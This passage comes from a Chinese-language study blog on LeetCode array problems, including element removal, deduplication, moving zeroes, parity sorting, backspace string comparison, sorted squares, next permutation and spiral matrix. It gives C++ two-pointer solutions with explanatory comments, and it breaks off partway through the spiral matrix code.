    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="七、数组"><a href="#七、数组" class="headerlink" title="七、数组"></a>七、数组</h2><h3 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27 移除元素"></a>27 移除元素</h3><p>给你一个数组 nums 和一个值 val，你需要 <strong>原地 移除</strong>所有数值等于 val 的元素，并返回移除后数组的新长度。<br>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。<br>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。<br><strong>误区：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (array[i] == target) &#123;</span><br><span class="line">        array.<span class="built_in">erase</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这个代码看上去好像是<span class="built_in">O</span>(n)的时间复杂度，其实是<span class="built_in">O</span>(n^<span class="number">2</span>)的时间复杂度，因为erase操作也是<span class="built_in">O</span>(n)的操作。</span><br><span class="line"></span><br><span class="line">所以此时使用双指针法才展现出效率的优势：通过两个指针在一个<span class="keyword">for</span>循环下完成两个<span class="keyword">for</span>循环的工作</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)<span class="comment">//满足条件才拷贝</span></span><br><span class="line">                nums[j++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针：其中一个指针用于遍历i，另一个相当于是“一个新的数组下标”j，其实还是原本的数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//至多遍历序列 两次</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != val)</span><br><span class="line">                nums[j++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>【<strong>双指针优化</strong>】：<br>    如果要移除的元素恰好在数组的开头。<br>    例如序列 [1,2,3,4,5]，当 val 为 1 时，我们需要把每一个元素都左移一位。注意到题目中说：「元素的顺序可以改变」。实际上我们可以直接将最后一个元素 5 移动到序列开头，取代元素 1，得到序列 [5,2,3,4]，同样满足题目要求。这个优化在序列中 val 元素的数量较少时非常有效。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针优化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//至多遍历序列 一次</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[left]==val)&#123;</span><br><span class="line">                nums[left] = nums[right<span class="number">-1</span>];</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力  O(n^2)  O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> size = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == val) &#123; <span class="comment">// 发现需要移除的元素，就将数组集体向前移动一位</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    nums[j - <span class="number">1</span>] = nums[j];</span><br><span class="line">                &#125;</span><br><span class="line">                i--; <span class="comment">// 因为下标i以后的数值都向前移动了一位，所以i也向前移动一位</span></span><br><span class="line">                size--; <span class="comment">// 此时数组的大小-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="26-删除有序数组中的重复项——留一个，返长度"><a href="#26-删除有序数组中的重复项——留一个，返长度" class="headerlink" title="26 删除有序数组中的重复项——留一个，返长度"></a>26 删除有序数组中的重复项——留一个，返长度</h3><p>给你一个 <strong>升序排列</strong> 的数组 nums ，请你 <strong>原地 删除</strong> 重复出现的元素，使每个元素 只出现一次 。<br>【返回删除后数组的新长度】。<br>元素的 相对顺序 应该保持 一致 。</p>
<p><strong>分析：</strong><br>定义两个指针 fast 和 slow 分别为快指针和慢指针，快指针表示遍历数组到达的下标位置，慢指针表示下一个不同元素要填入的下标位置，初始时两个指针都指向下标 1。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast=<span class="number">1</span>,slow=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast]!=nums[fast<span class="number">-1</span>])&#123;</span><br><span class="line">                nums[slow]=nums[fast];<span class="comment">//更新数组</span></span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="283-移动零——移到末尾"><a href="#283-移动零——移到末尾" class="headerlink" title="283 移动零——移到末尾"></a>283 移动零——移到末尾</h3><p>给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。【<strong>原地操作</strong>】</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;<span class="comment">//i遍历 j更新数组</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]!=<span class="number">0</span>)&#123;</span><br><span class="line">                nums[j++]=nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//后面补0即可</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> p=j;p&lt;n;p++)&#123;</span><br><span class="line">            nums[p]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//left指向0  right指向非0  然后交换，总是把0换到右边</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//left左边均是 非零数</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>(), left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[left], nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="905-按奇偶排序数组——偶前奇后"><a href="#905-按奇偶排序数组——偶前奇后" class="headerlink" title="905 按奇偶排序数组——偶前奇后"></a>905 按奇偶排序数组——偶前奇后</h3><p>给你一个整数数组 nums，将 nums 中的的所有偶数元素移动到数组的前面，后跟所有奇数元素。<br>返回满足此条件的 任一数组 作为答案.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[left]%<span class="number">2</span>==<span class="number">1</span> &amp;&amp; nums[right]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[left],nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[left]%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                left++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[right]%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">                right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="922-按奇偶排序数组-II——奇数放在奇数位，偶数放在偶数位"><a href="#922-按奇偶排序数组-II——奇数放在奇数位，偶数放在偶数位" class="headerlink" title="922 按奇偶排序数组 II——奇数放在奇数位，偶数放在偶数位"></a>922 按奇偶排序数组 II——奇数放在奇数位，偶数放在偶数位</h3><p>给定一个非负整数数组 nums，nums 中一半整数是 奇数 ，一半整数是 偶数 。<br>对数组进行排序，以便当 nums[i] 为奇数时，i 也是 奇数 ；当 nums[i] 为偶数时， i 也是 偶数 。<br>你可以返回 任何满足上述条件的数组作为答案 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针 i偶数位   j奇数位</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParityII</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n &amp;&amp; j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;n &amp;&amp; nums[i]%<span class="number">2</span>==<span class="number">0</span>)<span class="comment">//循环寻找 偶数位上 是奇数</span></span><br><span class="line">                i+=<span class="number">2</span>;<span class="comment">//是偶数正常，则跳过</span></span><br><span class="line">            <span class="keyword">while</span>(j&lt;n &amp;&amp; nums[j]%<span class="number">2</span>==<span class="number">1</span>)<span class="comment">//循环寻找 奇数位上 是偶数</span></span><br><span class="line">                j+=<span class="number">2</span>;<span class="comment">//是奇数正常，则跳过</span></span><br><span class="line">            <span class="keyword">if</span>(i&lt;n &amp;&amp; j&lt;n)</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="844-比较含退格的字符串"><a href="#844-比较含退格的字符串" class="headerlink" title="844 比较含退格的字符串"></a>844 比较含退格的字符串</h3><p>输入：s = “ab#c”, t = “ad#c”<br>输出：true<br>解释：s 和 t 都会变成 “ac”。</p>
<p><strong>几个知识点：</strong></p>
<ul>
<li>s.substr(0,s1)==t.substr(0,t1);子串截取</li>
<li>字符串里也有 push_back()在字符串 <code>末尾</code> 插入字符</li>
<li>pop_back() 删除字符串 <code>末尾</code> 的字符<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//str.substr(0,j);截取</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">after_back</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                str[j++]=str[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;<span class="number">0</span>)&#123;<span class="comment">//问题出现在这里，要考虑到开头是#的情况，</span></span><br><span class="line">                    j--;<span class="comment">//遇到#,j向后退一下</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//string res;</span></span><br><span class="line">        <span class="keyword">return</span> str.<span class="built_in">substr</span>(<span class="number">0</span>,j);<span class="comment">//返回字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        string s1 = <span class="built_in">after_back</span>(s);</span><br><span class="line">        string t1 = <span class="built_in">after_back</span>(t);</span><br><span class="line">        <span class="keyword">return</span> s1==t1;</span><br><span class="line">    <span class="comment">//或者返回长度，然后return s.substr(0,s1)==t.substr(0,t1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    官解</span></span><br><span class="line"><span class="comment">    push_back()     pop_back()</span></span><br><span class="line"><span class="comment">    字符串中的函数，可以理解为栈</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">after_back</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        string res;<span class="comment">//新定义了一个 string</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(str[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!res.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="comment">//删除字符串的最后一个字符</span></span><br><span class="line">                res.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">after_back</span>(s)==<span class="built_in">after_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="977 有序数组的平方"></a>977 有序数组的平方</h3>给你一个按【非递减顺序】排序的整数数组 nums，返回 每个数字的平方 组成的新数组，要求也按 非递减顺序 排序。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    nums[j++]=nums[i]*nums[i];</span></span><br><span class="line"><span class="comment">    或者ans.push_back(num * num);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//在原数组上改动</span></span><br><span class="line">            nums[j++]=nums[i]*nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">    重点在于 数组本身有序，则平方之后的最大值只可能是在 最左边 或者是 最右边</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> k = A.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//倒序 插入</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(A.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>, j=A.<span class="built_in">size</span>()<span class="number">-1</span>; i &lt;= j;) &#123; <span class="comment">//注意这里要i &lt;= j，因为最后要处理两个元素</span></span><br><span class="line">            <span class="keyword">if</span> (A[i]*A[i] &lt; A[j]*A[j])  &#123;</span><br><span class="line">                result[k--] = A[j]*A[j];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result[k--] = A[i]*A[i];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title="31 下一个排列"></a>31 下一个排列</h3>【下一个排列】的定义是：给定数字序列的字典序中下一个更大的排列。如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。<br><img src="https://img-blog.csdnimg.cn/01378ba8c5164db29609ef560d28871c.png"></li>
</ul>
<p><strong>思路：</strong><br><img src="https://img-blog.csdnimg.cn/39a23aa26e8b4a62aa0e90ba687c78c9.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(N)至多只需要扫描两次序列，以及进行一次反转操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=nums.<span class="built_in">size</span>()<span class="number">-2</span>;</span><br><span class="line">        <span class="comment">//从后向前找，第一个 下一个数&gt;前一个数 的情况</span></span><br><span class="line">        <span class="comment">//i指向 前面的 小数</span></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[i+<span class="number">1</span>])&#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> j = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            <span class="comment">//从后向前找（尽可能靠右），尽可能小的 大数</span></span><br><span class="line">            <span class="comment">//j指向后面的大数</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[j])&#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换 前面的小数 与 后面的大数</span></span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将i位置开始 后面 序列进行升序排列</span></span><br><span class="line">        <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>()+i+<span class="number">1</span>,nums.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="58-最后一个单词的长度"><a href="#58-最后一个单词的长度" class="headerlink" title="58 最后一个单词的长度"></a>58 最后一个单词的长度</h3><p>给你一个字符串 s，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 最后一个 单词的长度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    输入：s = &quot;Hello World&quot;</span></span><br><span class="line"><span class="comment">    输出：5 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; s[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="54-螺旋矩阵——模拟边界-顺时针打印"><a href="#54-螺旋矩阵——模拟边界-顺时针打印" class="headerlink" title="54 螺旋矩阵——模拟边界-顺时针打印"></a>54 螺旋矩阵——模拟边界-顺时针打印</h3><p><img src="https://img-blog.csdnimg.cn/3573df4312cd417090c1e3f69b14aa42.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(matrix.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> down = matrix.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//行：二维数组包含的一维数组个数</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = matrix[<span class="number">0</span>].<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//列：每个一维数组包含元素个数</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;i++)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[up][i]);<span class="comment">//从左向右移动，行不变</span></span><br><span class="line">            <span class="keyword">if</span>(++up&gt;down)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义上边界，即 下一行</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=up;i&lt;=down;i++)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[i][right]);<span class="comment">//从上向下移动，列不变</span></span><br><span class="line">            <span class="keyword">if</span>(--right&lt;left)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义右边界，即 向左一列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=right;i&gt;=left;i--)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[down][i]);<span class="comment">//从右向左移动，行不变</span></span><br><span class="line">            <span class="keyword">if</span>(--down&lt;up)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义下边界，即 向上一行</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=down;i&gt;=up;i--)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[i][left]);<span class="comment">//从下向上移动，列不变</span></span><br><span class="line">            <span 